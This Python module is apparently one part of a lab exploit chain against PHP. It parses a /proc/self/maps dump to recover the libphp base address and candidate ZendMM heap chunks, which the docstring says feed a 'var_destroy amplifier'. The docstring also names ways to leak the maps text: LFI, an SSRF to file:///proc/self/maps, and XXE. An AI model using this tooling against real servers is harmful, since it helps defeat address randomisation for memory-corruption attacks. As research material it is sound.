"""Parse a /proc/self/maps text dump into the two addresses Plan B needs.

The var_destroy amplifier needs one bootstrapping address. Any primitive that
discloses this worker's maps text can supply it -- an application LFI, a
curl() SSRF to file:///proc/self/maps, or an XXE with LIBXML_NOENT. This
module is the transport-independent core: it turns the text into the libphp
base and the candidate ZendMM 2 MiB "main" chunks.

Lab-only; pure parsing, no I/O.
"""

from __future__ import annotations

import re

_MAPS_RE = re.compile(
    r"^([0-9a-f]+)-([0-9a-f]+)\s+(....)\s+([0-9a-f]+)\s+\S+\s+\d+\s*(.*)$")


def parse_maps(text):
    """Return (libphp_base, [main_candidates]) from a maps dump.

    main candidates are 2 MiB-aligned rw anonymous mappings, exactly-2 MiB
    first (the ZendMM main chunk), deduplicated. A caller should still try
    each candidate: a transient extra mapping can qualify.
    """
    lib = None
    cands = []
    for line in text.splitlines():
        m = _MAPS_RE.match(line)
        if not m:
            continue
        start, end = int(m.group(1), 16), int(m.group(2), 16)
        perm, off, path = m.group(3), int(m.group(4), 16), m.group(5).strip()
        if "libphp" in path and off == 0 and perm.startswith("r-x"):
            lib = start
        if (path == "" and perm.startswith("rw") and (end - start) >= 0x200000
                and start % 0x200000 == 0):
            cands.append((start, end - start))
    cands.sort(key=lambda c: (c[1] != 0x200000, c[1], c[0]))
    seen = set()
    mains = []
    for start, _sz in cands:
        if start not in seen:
            seen.add(start)
            mains.append(start)
    return lib, mains


# --------------------------------------------------------------------------
# self-test (offline)
# --------------------------------------------------------------------------
_SAMPLE = """\
aaaae8ae0000-aaaae8b97000 r-xp 00000000 00:17f 17721760 /usr/sbin/apache2
ffff94a00000-ffff95179000 r-xp 00000000 00:199 20644465 /usr/lib/apache2/modules/libphp.so
ffff97e00000-ffff98000000 rw-p 00000000 00:00 0 
ffff9a000000-ffff9c400000 rw-p 00000000 00:00 0 
ffff9642d000-ffff9642e000 rw-p 00000000 00:00 0 
"""


def _self_test():
    lib, mains = parse_maps(_SAMPLE)
    assert lib == 0xFFFF94A00000, hex(lib or 0)
    # exact 2 MiB chunk first, then the larger aligned anon mapping
    assert mains == [0xFFFF97E00000, 0xFFFF9A000000], [hex(m) for m in mains]
    print("[ok] maps self-test (libphp base + 2 MiB main candidates)")


if __name__ == "__main__":
    import sys
    if "--self-test" in sys.argv:
        _self_test()
    else:
        print(__doc__)
